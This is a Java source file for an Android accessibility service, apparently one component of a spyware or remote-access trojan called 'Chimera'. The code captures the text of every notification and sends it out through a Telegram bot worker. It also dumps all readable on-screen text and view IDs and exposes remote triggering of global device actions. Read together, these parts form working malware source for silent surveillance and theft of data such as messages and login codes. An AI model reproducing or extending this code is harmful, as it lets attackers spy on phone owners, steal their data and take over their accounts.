package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class ChimeraAccessibilityService extends AccessibilityService {

    private static ChimeraAccessibilityService instance;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                String notificationText = event.getText().toString();
                TelegramBotWorker.sendMessage("Notification Captured:\n" + notificationText, getApplicationContext());
            }
        }
    }

    @Override
    public void onInterrupt() {
        instance = null;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.canRetrieveWindowContent = true;
        setServiceInfo(info);
    }

    public static boolean isServiceEnabled() {
        return instance != null;
    }

    public static void triggerGlobalAction(int action) {
        if (isServiceEnabled()) {
            instance.performGlobalAction(action);
        }
    }

    public static String getScreenContent() {
        if (!isServiceEnabled()) {
            return "Error: Accessibility Service is not enabled.";
        }
        AccessibilityNodeInfo rootNode = instance.getRootInActiveWindow();
        if (rootNode == null) {
            return "Error: Could not get the root node. The screen might be locked or empty.";
        }
        StringBuilder sb = new StringBuilder("--- Screen Content ---\n");
        dumpNode(rootNode, sb, 0);
        rootNode.recycle();
        return sb.toString();
    }

    private static void dumpNode(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;

        for (int i = 0; i < depth; i++) {
            sb.append("  ");
        }

        sb.append("[Class: ").append(node.getClassName());
        if (node.getViewIdResourceName() != null) {
            sb.append(", ID: ").append(node.getViewIdResourceName());
        }
        if (node.getText() != null) {
            sb.append(", Text: \"").append(node.getText()).append("\"");
        }
        if (node.getContentDescription() != null) {
            sb.append(", Desc: \"").append(node.getContentDescription()).append("\"");
        }
        sb.append("]\n");

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                dumpNode(child, sb, depth + 1);
                child.recycle();
            }
        }
    }
}